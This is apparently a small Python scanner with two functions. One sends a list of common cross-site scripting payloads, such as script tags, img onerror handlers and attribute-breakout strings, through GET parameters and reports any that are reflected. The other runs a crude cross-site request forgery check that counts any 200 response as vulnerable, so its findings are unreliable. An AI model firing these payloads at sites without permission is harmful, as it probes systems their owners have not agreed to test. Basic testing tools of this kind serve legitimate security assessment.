import requests
from bs4 import BeautifulSoup

def run_xss_test(target_url):
    # A few example payloads
    xss_payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
    '<iframe src="javascript:alert(`xss`)">',
    '<img src="x" onerror="alert(\'XSS\')">',
    '"><script>alert("XSS")</script>',
    '"><img src=x onerror=alert(1)>',
    "';alert('XSS');//",
    "');alert('XSS');//",
    "' onmouseover='alert(1)' bad='",
    '" autofocus onfocus="alert(1)"',
    "<a href='javascript:alert(\"XSS\")'>Click me</a>"
    ]
    results = []

    # Simple GET parameter test
    for param_name in ["query", "input", "search", "text"]:
        for payload in xss_payloads:
            try:
                response = requests.get(target_url, params={param_name: payload})
                if payload in response.text:
                    results.append({
                        "parameter": param_name,
                        "payload": payload,
                        "vulnerable": True,
                        "snippet": response.text[:150]
                    })
            except requests.RequestException as e:
                results.append({"error": str(e)})

    # Additional form-based submission logic can go here...
    return results

def run_csrf_test(target_url):
    results = []
    # Very minimal CSRF test example
    try:
        resp = requests.post(target_url, data={"test_field": "csrf_test"})
        if resp.status_code == 200:
            results.append({
                "vulnerable": True,
                "description": "Endpoint might be responding to CSRF request"
            })
    except requests.RequestException as e:
        results.append({"error": str(e)})
    return results
